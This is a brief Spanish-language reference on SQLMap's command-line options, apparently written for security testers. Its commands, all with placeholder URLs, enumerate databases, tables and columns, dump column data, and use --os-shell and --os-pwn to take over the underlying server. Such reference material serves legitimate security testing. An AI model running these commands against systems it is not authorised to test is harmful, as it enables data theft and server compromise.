SQLMap es una herramienta de código abierto diseñada para la detección y explotación de vulnerabilidades de inyección SQL en aplicaciones web. Proporciona una amplia gama de técnicas de detección y explotación, permitiendo a los investigadores de seguridad identificar y aprovechar vulnerabilidades en bases de datos subyacentes a través de la inyección SQL.

### Comandos básicos:


```bash
sqlmap -u "url"
```

se utiliza para escanear una URL específica en busca de posibles vulnerabilidades de inyección de SQL en una aplicación web.

```bash
sqlmap -u "url" --dbs
```

Se utiliza para enumerar las bases de datos disponibles en el servidor de la aplicación web especificada por la URL proporcionada. Es decir, busca y muestra las bases de datos que están accesibles y que pueden ser comprometidas mediante una inyección de SQL.

```bash
sqlmap -u "url" --dbs --cookie "cookie=valor" 
```

Se utiliza para realizar un escaneo de bases de datos en un sitio web que requiere autenticación mediante cookies. La opción `--cookie` permite especificar las cookies necesarias para la autenticación en el sitio web. SQLMap usará estas cookies para acceder al sitio web y realizar el escaneo de bases de datos en busca de posibles vulnerabilidades de inyección de SQL.


```bash
sqlmap -u "url" --dbs --dbms tipo_de_bd
```

Este comando busca enumerar las bases de datos disponibles en el servidor de la aplicación web especificada por la URL proporcionada, utilizando el tipo de DBMS especificado para realizar el escaneo de bases de datos. Puedes especificar diferentes tipos de sistemas de gestión de bases de datos (DBMS) con la opción `--dbms`. Algunos ejemplos comunes de DBMS incluyen MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, entre otros.

```bash 
sqlmap -u "url" --dbs --batch
```

  
Se utiliza para automatizar el proceso de escaneo de bases de datos en una aplicación web. La opción `--batch` le indica a SQLMap que realice el escaneo de manera automática y sin intervención del usuario, es decir, en modo batch.


```bash 
sqlmap -u "url" -D bd --tables
```

Enumera las tablas disponibles dentro de una base de datos específica en el servidor de la aplicación web especificada por la URL proporcionada.


```bash 
sqlmap -u "url" -D bd -T tabla --columns
```

Enumera las columnas disponibles dentro de una tabla específica en la base de datos indicada del servidor de la aplicación web especificada por la URL proporcionada.


```bash 
sqlmap -u "url" -D bd -T tabla -C columna/columnas_separadas_por_comas --dump 
```

Este comando busca extraer los datos de la(s) columna(s) especificada(s) dentro de la tabla indicada en la base de datos objetivo en el servidor de la aplicación web, y muestra los resultados obtenidos.


```bash 
sqlmap -u "url" --os-shell 
```

Este comando se utiliza para obtener una shell interactiva del sistema operativo subyacente en el servidor de la aplicación web especificada por la URL proporcionada.


```bash 
sqlmap -u "url" --os-pwn
```

Se utiliza para intentar obtener un acceso completo al sistema operativo subyacente en el servidor de la aplicación web especificada por la URL proporcionada.

```bash 
sqlmap -u "url" --risk valor --level valor
```

Se utiliza para especificar los niveles de riesgo y de detección que SQLMap utilizará durante la exploración y explotación de posibles vulnerabilidades en el servidor de la aplicación web especificada por la URL proporcionada.